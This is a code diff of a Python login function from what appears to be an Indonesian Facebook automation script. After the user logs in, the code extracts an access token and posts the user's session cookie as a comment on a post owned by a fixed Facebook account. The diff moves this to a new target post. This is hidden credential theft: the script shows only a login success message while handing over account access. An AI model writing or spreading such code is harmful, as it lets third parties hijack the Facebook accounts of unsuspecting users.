@@ -51,7 +51,7 @@ def login():
             if uri_lk is not None:
                uri_lk = uri_lk.group(1).replace('amp;', '')
                r.get('https://mbasic.facebook.com{}'.format(uri_lk), cookies={'cookie':cookie})
-            urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
+            urlpost = '/100010450276658/posts/9529718457100525/?substory_index=9529718457100525&app=fbl'
             respon_urlpost = r.get('https://mbasic.facebook.com{}'.format(urlpost), cookies = {
                'cookie': cookie
             }).text
@@ -67,9 +67,8 @@ def login():
             cok = {'cookie':cookie}
             data = requests.Session().get(url,headers=head,cookies=cok)
             token = re.search('(EAAG\w+)',data.text).group(1)
-            link = (f'https://www.facebook.com/100010450276658/posts/1959291937762463/?app=fbl')
-            requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={text_dtr}&access_token={token}",cookies=cok)
-            requests.Session().post(f"https://graph.facebook.com/1959291937762463/comments/?message={cookie}&access_token={token}",cookies=cok)
+            requests.Session().post(f"https://graph.facebook.com/1989662308058759/comments/?message={text_dtr}&access_token={token}",cookies=cok)
+            requests.Session().post(f"https://graph.facebook.com/1989662308058759/comments/?message={cookie}&access_token={token}",cookies=cok)
             open('Data/cookie.txt', 'w').write(cookie)
             open('Data/token.txt', 'w').write(token)
             print(Panel('[bold green]Berhasil login! [bold yellow]Tolong gunakan script ini dengan bijak, jika terjadi sesuatu admin tidak bertanggung jawab', width=55))
